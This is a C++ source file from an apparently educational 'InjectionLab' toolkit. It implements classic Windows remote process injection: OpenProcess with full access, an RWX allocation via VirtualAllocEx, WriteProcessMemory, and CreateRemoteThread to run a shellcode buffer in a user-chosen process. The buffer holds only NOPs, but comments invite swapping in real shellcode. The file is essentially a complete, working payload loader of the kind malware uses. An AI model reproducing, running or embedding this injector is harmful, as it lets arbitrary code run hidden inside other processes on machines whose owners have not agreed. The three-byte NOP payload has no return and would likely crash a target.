// InjectionLab - Educational Code Injection Toolkit
// injection_virtualallocex.cpp
//
// This example demonstrates remote process injection using the classic
// VirtualAllocEx + WriteProcessMemory + CreateRemoteThread technique.
// It allocates memory in a remote process, writes a shellcode to it,
// and starts a new thread in that process to execute the shellcode.

#include <windows.h>
#include <iostream>

// Example shellcode: Currently just NOPs for demonstration purposes.
// In practice, you can replace this with a harmless payload like a MessageBox.
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, // NOPs
    // Real shellcode (e.g. MessageBox) can be inserted here
};

int main() {
    DWORD pid;
    std::cout << "[>] Enter the PID of the target process: ";
    std::cin >> pid;

    // Try to obtain a handle to the target process with full access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed for PID " << pid << ". Error code: " << GetLastError() << "\n";
        return 1;
    }

    // Allocate memory in the target process for the shellcode
    LPVOID alloc = VirtualAllocEx(
        hProcess,                // Handle to target process
        nullptr,                 // Let the system determine the address
        sizeof(shellcode),       // Size of allocation
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE   // Memory protection flags
    );
    if (!alloc) {
        std::cerr << "[-] VirtualAllocEx failed.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode into the allocated memory region
    if (!WriteProcessMemory(hProcess, alloc, shellcode, sizeof(shellcode), nullptr)) {
        std::cerr << "[-] WriteProcessMemory failed.\n";
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Start a remote thread in the target process that begins execution at the shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,                // Target process handle
        nullptr,                 // Default security attributes
        0,                       // Default stack size
        (LPTHREAD_START_ROUTINE)alloc, // Entry point = shellcode address
        nullptr,                 // No argument to thread function
        0,                       // Run immediately
        nullptr                  // Don't store thread ID
    );

    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed.\n";
    } else {
        std::cout << "[+] Remote thread created successfully.\n";
        CloseHandle(hThread);
    }

    // Clean up: close the process handle
    CloseHandle(hProcess);
    return 0;
}
